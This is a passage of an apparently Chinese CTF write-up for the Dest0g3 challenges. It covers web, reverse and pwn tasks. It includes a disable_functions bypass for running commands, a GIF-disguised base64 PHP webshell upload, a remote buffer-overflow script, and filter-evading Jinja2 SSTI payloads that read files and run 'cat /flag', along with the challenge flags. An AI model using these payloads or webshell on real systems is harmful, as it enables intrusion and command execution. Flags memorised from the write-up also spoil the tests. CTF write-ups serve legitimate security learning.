<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://site.com/bypass_disablefunc.php?cmd=id&amp;outpath=/tmp/xx&amp;sopath=/var/www/html/bypass_disablefunc_x64.so</span><br></pre></td></tr></table></figure>

<p>注意需要将bypass_disablefunc.php的&lt;?php改为&lt;?=,并将其base64上传</p>
<p>最终的payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://54891b51-4f49-49f9-98fb-55044c245e0f.node4.buuoj.cn:81/uploads/c47b21fcf8f0bc8b3920541abd8024fd/shell.abc?cmd=cat ./../../../../../../../flag&amp;outpath=/tmp/xxx&amp;sopath=/var/www/html/uploads/c47b21fcf8f0bc8b3920541abd8024fd/bypass_disablefunc_x64.so</span><br><span class="line">得到</span><br><span class="line"> cmdline: cat ./../../../../../../../flag &gt; /tmp/xxx 2&gt;&amp;1</span><br><span class="line"></span><br><span class="line">output:</span><br><span class="line">Dest0g3&#123;3f38e74c-804f-400b-8d3f-d367954479cd&#125;</span><br></pre></td></tr></table></figure>

<p>这道题考到了如何绕过disable_functions</p>
<p>源代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">   <span class="variable">$tmpfile</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]; <span class="comment">//获取路径</span></span><br><span class="line">   <span class="variable">$filename</span> = strtolower(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]); <span class="comment">//将文件名+后缀转为小写</span></span><br><span class="line">   <span class="variable">$ext</span> = pathinfo(<span class="variable">$filename</span>,PATHINFO_EXTENSION);<span class="comment">//pathinfo() 函数以数组的形式返回文件路径的信息。 只返回文件的后缀名</span></span><br><span class="line">   <span class="keyword">if</span> (strpos(<span class="variable">$ext</span>,<span class="string">&quot;ph&quot;</span>)===<span class="literal">false</span>) &#123; <span class="comment">//不能含有配合ph</span></span><br><span class="line">       <span class="variable">$content</span> = file_get_contents(<span class="variable">$tmpfile</span>);</span><br><span class="line">       <span class="keyword">if</span> (strpos(<span class="variable">$content</span>,<span class="string">&quot; print(&quot;</span><span class="string">&quot;); //文件内容不能有 &quot;</span> <span class="keyword">print</span>(<span class="string">&quot;&quot;</span>); </span><br><span class="line">           <span class="keyword">exit</span>();</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="variable">$user_dir</span> = <span class="string">&quot;uploads/&quot;</span>.md5(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">       <span class="keyword">if</span> (!is_dir(<span class="variable">$user_dir</span>)) &#123;</span><br><span class="line">           mkdir(<span class="variable">$user_dir</span>);</span><br><span class="line">       &#125;</span><br><span class="line">       chdir(<span class="variable">$user_dir</span>); <span class="comment">//更改当前目录</span></span><br><span class="line">       move_uploaded_file(<span class="variable">$tmpfile</span>,<span class="variable">$filename</span>);<span class="comment">//本函数检查并确保由 file 指定的文件是合法的上传文件（即通过 PHP 的 HTTP POST 上传机制所上传的）。如果文件合法，则将其移动为由 newloc 指定的文件。如果 file 不是合法的上传文件，不会出现任何操作，move_uploaded_file() 将返回 false。如果 file 是合法的上传文件，但出于某些原因无法移动，不会出现任何操作，move_uploaded_file() 将返回 false，此外还会发出一条警告。这种检查显得格外重要，如果上传的文件有可能会造成对用户或本系统的其他用户显示其内容的话。</span></span><br><span class="line">       print_r(<span class="string">&quot;上传成功~文件名：&quot;</span>.<span class="variable">$user_dir</span>.<span class="string">&quot;/&quot;</span>. <span class="variable">$filename</span>);</span><br><span class="line">   &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">       <span class="keyword">print</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">       <span class="keyword">exit</span>();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>2.构造的payload:GIF89a11PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg== </p>
<p>多加个1是为了防止base64吞掉后面的字符</p>
<h3 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h3><h4 id="simpleXOR"><a href="#simpleXOR" class="headerlink" title="simpleXOR"></a>simpleXOR</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">v4 = [</span><br><span class="line">  <span class="number">0xB3</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x91</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x82</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x80</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC3</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x9B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xCE</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x75</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xCF</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x9C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x9A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x85</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x85</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xCD</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xB8</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x84</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xAA</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x7D</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xBD</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xBB</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0xB1</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xB5</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x96</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x71</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x8D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x9E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x86</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xBF</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x73</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xA8</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0xA3</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x9C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x83</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x65</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x9E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x57</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">v6 = <span class="number">0xf7</span></span><br><span class="line">v5 = <span class="string">&quot;&quot;</span></span><br><span class="line">v3 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">36</span>):</span><br><span class="line">    v3.append((v4[i*<span class="number">4</span>] ^ v6) - i)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(v3)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> v3:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i),end = <span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="comment">#Dest0g3&#123;0bcgf-AdMy892-KobPW-hB6LTqG&#125;</span></span><br></pre></td></tr></table></figure>

<h4 id="hi"><a href="#hi" class="headerlink" title="hi"></a>hi</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> __int64 _QWORD ;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> __int32 _DWORD ;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> str[<span class="number">45</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">char</span> enc[<span class="number">45</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  *(_QWORD *)enc = <span class="number">0x9F8E7A1CC6486497</span>LL;</span><br><span class="line">  *(_QWORD *)&amp;enc[<span class="number">8</span>] = <span class="number">0x69EEF382E760BD46</span>LL;</span><br><span class="line">  *(_QWORD *)&amp;enc[<span class="number">16</span>] = <span class="number">0xB9C017E2E30EF749</span>LL;</span><br><span class="line">  *(_QWORD *)&amp;enc[<span class="number">24</span>] = <span class="number">0x98410148A430392C</span>LL;</span><br><span class="line">  *(_QWORD *)&amp;enc[<span class="number">32</span>] = <span class="number">0xE80E7411E5B5A939</span>LL;</span><br><span class="line">  *(_DWORD *)&amp;enc[<span class="number">40</span>] = <span class="number">0xA58BFDAC</span>;</span><br><span class="line">  enc[<span class="number">44</span>] = <span class="number">0x6D</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> x[] = &#123;</span><br><span class="line">  <span class="number">0x7B</span>, <span class="number">0x51</span>, <span class="number">0xF3</span>, <span class="number">0x5A</span>, <span class="number">0xCC</span>, <span class="number">0x39</span>, <span class="number">0xF9</span>, <span class="number">0x92</span>, <span class="number">0x1C</span>, <span class="number">0x9E</span>,</span><br><span class="line">  <span class="number">0x58</span>, <span class="number">0x69</span>, <span class="number">0x9D</span>, <span class="number">0xF7</span>, <span class="number">0xFD</span>, <span class="number">0x4A</span>, <span class="number">0x3E</span>, <span class="number">0xFB</span>, <span class="number">0x1D</span>, <span class="number">0x2C</span>,</span><br><span class="line">  <span class="number">0x4D</span>, <span class="number">0x0C</span>, <span class="number">0x70</span>, <span class="number">0xB1</span>, <span class="number">0x3B</span>, <span class="number">0x8D</span>, <span class="number">0x25</span>, <span class="number">0xED</span>, <span class="number">0x91</span>, <span class="number">0xB1</span>,</span><br><span class="line">  <span class="number">0x73</span>, <span class="number">0x8D</span>, <span class="number">0x82</span>, <span class="number">0xE6</span>, <span class="number">0xE7</span>, <span class="number">0x50</span>, <span class="number">0x20</span>, <span class="number">0x61</span>, <span class="number">0x62</span>, <span class="number">0x3C</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x3A</span>, <span class="number">0xA6</span>, <span class="number">0x9D</span>, <span class="number">0x32</span></span><br><span class="line">&#125;;</span><br><span class="line">string stsr = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  <span class="keyword">for</span> ( <span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">44</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">   <span class="keyword">int</span> v1;</span><br><span class="line">   <span class="keyword">int</span> flag = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">1</span>;j&lt;=<span class="number">127</span>;j++)&#123;</span><br><span class="line">      v1 = <span class="number">23</span> * j;</span><br><span class="line">     <span class="keyword">if</span> ( (BYTE)(((BYTE)v1 + x[i])) % <span class="number">0xff</span> !=  (BYTE)enc[i]  % <span class="number">0xff</span>)</span><br><span class="line">     &#123;</span><br><span class="line">      <span class="keyword">if</span>(i == <span class="number">7</span>)&#123;</span><br><span class="line">       <span class="keyword">if</span>((BYTE)v1 == <span class="number">0xD</span>)&#123;</span><br><span class="line">        cout&lt;&lt;((BYTE)v1 + x[i]) % <span class="number">0xff</span>&lt;&lt;<span class="string">&quot;  e1111&quot;</span>&lt;&lt;endl;</span><br><span class="line">     cout&lt;&lt;(DWORD)(BYTE)enc[i]&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">       cout&lt;&lt;(<span class="keyword">int</span>)(BYTE)v1&lt;&lt;endl;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">continue</span>;</span><br><span class="line">  &#125;    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">     flag = <span class="number">1</span>;</span><br><span class="line">     stsr += j;</span><br><span class="line">     </span><br><span class="line">     <span class="keyword">break</span>;</span><br><span class="line">     &#125;   </span><br><span class="line">    &#125;</span><br><span class="line">       </span><br><span class="line">    <span class="keyword">if</span>(!flag)&#123;</span><br><span class="line">     cout&lt;&lt;i&lt;&lt;<span class="string">&quot; &quot;</span>&lt;&lt;(DWORD)v1&lt;&lt;<span class="string">&quot; &quot;</span>&lt;&lt;(DWORD)str[i]&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  cout&lt;&lt;stsr&lt;&lt;endl;</span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">#Dest0g3&#123;f982cd79-d7a3<span class="number">-0874</span>-aa0b-a5b37e4445c8&#125;</span><br></pre></td></tr></table></figure>

<h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><h4 id="ez-aarch"><a href="#ez-aarch" class="headerlink" title="ez_aarch"></a>ez_aarch</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">25747</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span>*<span class="number">0X28</span>+p8(<span class="number">0x3c</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;Please leave your name:\n&quot;</span>,payload)</span><br><span class="line"><span class="comment">#payload = b&quot;A&quot;*0X28+b&quot;\xA8&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment">#Dest0g3&#123;51e217e2-9ae5-458a-80fc-8b7769b58943&#125;</span></span><br></pre></td></tr></table></figure>

<p>复现</p>
<h3 id="WEB-1"><a href="#WEB-1" class="headerlink" title="WEB"></a>WEB</h3><h4 id="EasySSTI"><a href="#EasySSTI" class="headerlink" title="EasySSTI"></a>EasySSTI</h4><p>过滤了很多的内容，几乎把能过滤的都过滤了。</p>
<p>过滤了[ , ,’,”,request,_,.,pop</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">首先用%0a,或%0c绕过空格的过滤，然后利用&#123;%%&#125;和set绕过关键字，利用pop和()|select|string|list得到下划线，最后就是用__getitem__</span><br><span class="line"></span><br><span class="line">构造类似x.__init__.__globals__[&#x27;__builtins__&#x27;].chr 这种payload得到chr和open，猜测flag在根目录下的/flag中，尝试读取</span><br><span class="line"></span><br><span class="line">最终payload</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set po=dict(po=a,p=a)|join%&#125;</span><br><span class="line">&#123;% set a=(()|select|<span class="keyword">string</span>|<span class="keyword">list</span>)|attr(po)(<span class="number">24</span>)%&#125;</span><br><span class="line">&#123;% set ini=(a,a,dict(init=a)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% set glo=(a,a,dict(globals=a)|join,a,a)|join()%&#125;<span class="comment">#(&quot;_&quot;,&quot;_&quot;,&quot;init&quot;,&quot;_&quot;,&quot;_&quot;)|join()  实际上使用可以不用join后面的括号</span></span><br><span class="line">&#123;% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% set built=(a,a,dict(builtins=a)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%&#125;</span><br><span class="line">&#123;% set chr=x.chr%&#125;</span><br><span class="line">&#123;% set file=chr(<span class="number">47</span>)%<span class="number">2</span>bchr(<span class="number">102</span>)%<span class="number">2</span>bchr(<span class="number">108</span>)%<span class="number">2</span>bchr(<span class="number">97</span>)%<span class="number">2</span>bchr(<span class="number">103</span>)%&#125;</span><br><span class="line">&#123;%<span class="keyword">print</span>(x.open(file).read())%&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload1:</span><br><span class="line">username=&#123;%<span class="built_in">set</span>%0apo=<span class="built_in">dict</span>(po=a,p=a)|join%&#125;&#123;%<span class="built_in">set</span>%0aa=(()|select|string|<span class="built_in">list</span>)|attr(po)(<span class="number">24</span>)%&#125;&#123;%<span class="built_in">set</span>%0aini=(a,a,<span class="built_in">dict</span>(<span class="keyword">in</span>=a,it=a)|join,a,a)|join()%&#125;&#123;%<span class="built_in">set</span>%0aglo=(a,a,<span class="built_in">dict</span>(gl=a,obals=a)|join,a,a)|join()%&#125;&#123;%<span class="built_in">set</span>%0ageti=(a,a,<span class="built_in">dict</span>(getit=a,em=a)|join,a,a)|join()%&#125;&#123;%<span class="built_in">set</span>%0abuilt=(a,a,<span class="built_in">dict</span>(bui=a,ltins=a)|join,a,a)|join()%&#125;&#123;%<span class="built_in">set</span>%0ax=(q|attr(ini)|attr(glo)|attr(geti))(built)%&#125;&#123;%%0aset%0ach=<span class="built_in">dict</span>(ch=a,r=a)|join%&#125;&#123;%<span class="built_in">set</span>%0ax=(q|attr(ini)|attr(glo)|attr(geti))(built)%&#125;&#123;%<span class="built_in">set</span>%0achr=(x|attr(geti))(ch)%&#125;&#123;%<span class="built_in">set</span>%0afile=<span class="built_in">chr</span>(<span class="number">47</span>)%2bchr(<span class="number">102</span>)%2bchr(<span class="number">108</span>)%2bchr(<span class="number">97</span>)%2bchr(<span class="number">103</span>)%&#125;&#123;%%0aset%0aop=<span class="built_in">dict</span>(ope=a,n=a)|join%&#125;&#123;%<span class="built_in">set</span>%0aopen=(x|attr(geti))(op)%&#125;&#123;%%0aset%0are=<span class="built_in">dict</span>(re=a,ad=a)|join%&#125;&#123;%<span class="built_in">print</span>(<span class="built_in">open</span>(file)|attr(re)())%&#125;&amp;password=x</span><br></pre></td></tr></table></figure>

<p>payload2：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=&#123;%set%0ac=dict(c=aa)|reverse|first%&#125;&#123;%set%0abfh=self|string|urlencode|first%&#125;&#123;%set%0abfhc=bfh~c%&#125;&#123;%set%0aslas=bfhc%((47)|int)%&#125;&#123;%set%0apo=dict(po=a,p=a)|join%&#125;&#123;%set%0aa=(()|select|string|list)|attr(po)(24)%&#125;&#123;%set%0akg=(()|select|string|list)|attr(po)(10)%&#125;&#123;%set%0aini=(a,a,dict(in=a,it=a)|join,a,a)|join()%&#125;&#123;%set%0aglo=(a,a,dict(glob=a,als=a)|join,a,a)|join()%&#125;&#123;%set%0ageti=(a,a,dict(getit=a,em=a)|join,a,a)|join()%&#125;&#123;%set%0axx=cycler|attr(ini)|attr(glo)%&#125;&#123;%set%0ao=dict(o=a,s=a)|join%&#125;&#123;%set%0ass=xx|attr(geti)(o)%&#125;&#123;%set%0aop=dict(po=a,pen=a)|join%&#125;&#123;%set%0acmd=(dict(cat=a)|join,kg,slas,dict(flag=a)|join)|join()%&#125;&#123;%set%0are=dict(re=a,ad=a)|join%&#125;&#123;%print(ss|attr(op)(cmd)|attr(re)())%&#125;&amp;password=123</span><br></pre></td></tr></table></figure>

<p>注意:</p>
<p>有时候过滤特别严格得时候，我们就需要自己想法来构造字符串</p>
<h3 id="过滤器-select-string"><a href="#过滤器-select-string" class="headerlink" title="过滤器 ()|select|string"></a>过滤器 ()|select|string</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">()|select|string`得到的结果是: `&lt;generator object select_or_reject at 0x十六进制数字&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">可以看到有下划线什么的，然后我们就可以用`()|select|string[24]`等来取字符，其实`foobar|select|string`也是一样的</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;(()|select|string)[<span class="number">24</span>]~</span><br><span class="line">(()|select|string)[<span class="number">24</span>]~</span><br><span class="line">(()|select|string)[<span class="number">15</span>]~</span><br><span class="line">(()|select|string)[<span class="number">20</span>]~</span><br><span class="line">(()|select|string)[<span class="number">6</span>]~</span><br><span class="line">(()|select|string)[<span class="number">18</span>]~</span><br><span class="line">(()|select|string)[<span class="number">18</span>]~</span><br><span class="line">(()|select|string)[<span class="number">24</span>]~</span><br><span class="line">(()|select|string)[<span class="number">24</span>]&#125;&#125; = <span class="string">&quot;__classs__&quot;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Copy</span><br><span class="line"></span><br><span class="line">如果过滤了中括号，还可以使用`foobar|select|string|list`转换为列表后，使用`pop`或者`__getitem__`来取值</span><br></pre></td></tr></table></figure>

<h3 id="dict-clas-a-s-b-join"><a href="#dict-clas-a-s-b-join" class="headerlink" title="dict(clas=a,s=b)|join"></a>dict(<strong>clas=a,s</strong>=b)|join</h3><p>使用<code>dict(cla=a,s=b)|join</code>后，得到的是字符串”class”，可以直接看看下面的payload</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> po=<span class="built_in">dict</span>(po=a,p=a)|join%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> a=(()|select|string|<span class="built_in">list</span>)|attr(po)(<span class="number">24</span>)%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> ini=(a,a,<span class="built_in">dict</span>(init=a)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> glo=(a,a,<span class="built_in">dict</span>(<span class="built_in">globals</span>=a)|join,a,a)|join()%&#125;<span class="comment">#(&quot;_&quot;,&quot;_&quot;,&quot;init&quot;,&quot;_&quot;,&quot;_&quot;)|join()  实际上使用可以不用join后面的括号</span></span><br><span class="line">&#123;% <span class="built_in">set</span> geti=(a,a,<span class="built_in">dict</span>(getitem=a)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> built=(a,a,<span class="built_in">dict</span>(builtins=a)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> x=(q|attr(ini)|attr(glo)|attr(geti))(built)%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> <span class="built_in">chr</span>=x.<span class="built_in">chr</span>%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> file=<span class="built_in">chr</span>(<span class="number">47</span>)%2bchr(<span class="number">102</span>)%2bchr(<span class="number">108</span>)%2bchr(<span class="number">97</span>)%2bchr(<span class="number">103</span>)%&#125;</span><br><span class="line">&#123;%<span class="built_in">print</span>(x.<span class="built_in">open</span>(file).read())%&#125;</span><br></pre></td></tr></table></figure>

<p>Copy</p>
<h3 id="dict-e-a-join-count"><a href="#dict-e-a-join-count" class="headerlink" title="dict(e=a)|join|count"></a>dict(e=a)|join|count</h3><p>当过滤数字的时候，我们可以用这种方法得到数字</p>
